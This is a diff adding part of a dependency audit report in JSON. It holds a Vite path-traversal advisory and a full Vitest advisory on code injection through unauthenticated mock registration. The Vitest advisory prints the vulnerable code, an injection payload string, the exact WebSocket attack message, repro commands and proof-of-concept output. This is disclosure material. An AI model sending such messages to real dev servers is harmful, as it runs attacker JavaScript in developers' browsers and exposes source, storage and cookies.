+      "reported_by": null,
+      "title": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+      "metadata": null,
+      "cves": ["CVE-2026-112946"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.1.5",
+      "github_advisory_id": "GHSA-rq7h-c2jc-7f22",
+      "recommendation": "Upgrade to version 8.1.6 or later",
+      "patched_versions": ">=8.1.6",
+      "updated": "2026-10-21T16:47:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22", "CWE-284"],
+      "url": "https://github.com/advisories/GHSA-rq7h-c2jc-7f22"
+    },
+    "1242767": {
+      "findings": [
+        {
+          "version": "4.1.10",
+          "paths": ["apps__web>vitest>@vitest/mocker"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-qxg6-89mg-rqv8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112949\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-qxg6-89mg-rqv8",
+      "created": "2026-10-21T19:54:26.000Z",
+      "id": 1242767,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.\n\nSame handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.\n\n### Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.\n\nProjects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.\n\n### Details\n\n`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:\n\n```ts\nexport function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '\"__vitest_mocker__\"'): string {\n  const source = `\nconst __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule(\"${moduleUrl}\");\n`\n```\n\n`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.\n\n`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:\n\n```ts\nconfigureServer(server) {\n  if (options.registerWebSocketEvents === false) { return }\n  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {\n    if (event.type === 'manual') {\n      const module = ManualMockedModule.fromJSON(event, async () => {\n        const keys = await getFactoryExports(event.url)\n        return Object.fromEntries(keys.map(key => [key, null]))\n      })\n      registry.add(module)                       // no validation of `id` or `url`\n    }\n    else {\n      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }\n```\n\n`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.\n\nWith `url = 'x\"); globalThis.ARES_INJECTED = 1; void(\"'` a request for `/src/app.js` is answered with valid, executable JavaScript:\n\n```js\nconst __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n```\n\n`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__[\"X\"]`, `export { __0 as \"X\" }` and `resolvedModule[\"X\"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.\n\n**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.\n\n### PoC\n\n`poc/mocker-manual-mock-injection/` — `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.\n\nEnvironment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.\n\n```bash\ngit clone https://github.com/vitest-dev/vitest && cd vitest\ngit checkout 9e1166959e14bd32298d8a0e85352431c769ec7a\npnpm install && pnpm build\nREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh\n```\n\nRequired configuration — the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):\n\n```ts\nimport { interceptorPlugin } from '@vitest/mocker/node'\nexport default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()\n```\n\nThe attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:\n\n```json\n{ \"type\": \"custom\", \"event\": \"vitest:interceptor:register\",\n  \"data\": { \"type\": \"manual\", \"raw\": \"\", \"id\": \"<abs path of a served module>\",\n            \"url\": \"x\\\"); globalThis.ARES_INJECTED = 1; void(\\\"\" } }\n```\n\nthen answering the server's `vitest:interceptor:resolve` with `{\"type\":\"custom\",\"event\":\"vitest:interceptor:resolved\",\"data\":{\"url\":\"<same url>\",\"keys\":[\"a\"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.\n\nObserved output:\n\n```\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400\nPASS  negative control: with no mock registered the real module is served\nPASS  negative control: a mock with a harmless url replaces the module but injects nothing\n--- module served for /src/app.js ---\n    const __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n\n    let __0 = __factoryModule__[\"a\"]\n    export { __0 as \"a\" }\n    if (__factoryModule__.__factoryPromise != null) {\n      __factoryModule__.__factoryPromise.then((resolvedModule) => {\n        __0 = resolvedModule[\"a\"];\n      })\n    }\nPASS  attacker statement is present in the module the dev server serves\nPASS  the real module body was replaced\nPASS  the injected module parses as JavaScript (Vite import analysis accepted it)\n\nRESULT: VULNERABLE\n```\n\n* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.\n* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.\n* **Precondition controls** — the two `Origin` probes record the boundary honestly.\n* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with \"content contains invalid JS syntax\"), so acceptance proves the injected module is valid, executable JavaScript.\n\nReproduced three times from a clean `mktemp` fixture, exit 0 each time.\n\n### Impact\n\nCode injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n\nDisclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.",
+      "reported_by": null,
+      "title": "Vitest: Code injection via unauthenticated manual mock registration",
+      "metadata": null,
+      "cves": ["CVE-2026-112949"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0-beta.7 <4.1.12",
+      "github_advisory_id": "GHSA-qxg6-89mg-rqv8",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:54:27.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": ["CWE-94", "CWE-116", "CWE-306"],
+      "url": "https://github.com/advisories/GHSA-qxg6-89mg-rqv8"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 6,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 173,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 173
+  }
+}
